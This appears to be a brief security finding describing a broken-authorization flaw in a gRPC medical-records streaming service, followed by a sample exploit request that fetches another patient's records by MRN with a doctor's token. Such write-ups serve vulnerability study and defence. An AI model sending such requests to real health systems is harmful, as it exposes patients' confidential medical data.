diagnosis: The gRPC streaming servicer authenticates the caller as a doctor, but queries medical records based solely on request.patient_mrn without verifying that the doctor is currently assigned to the patient's care team. Any doctor on the network can stream complete medical summaries and diagnoses for any patient.
exploit_request:
POST /health.EHRService/StreamHealthSummary HTTP/2.0
Host: medical.example.com
Content-Type: application/grpc
TE: trailers
authorization: Bearer <attacker_doctor_token>

[gRPC payload: patient_mrn: "MRN-2024-99812"]
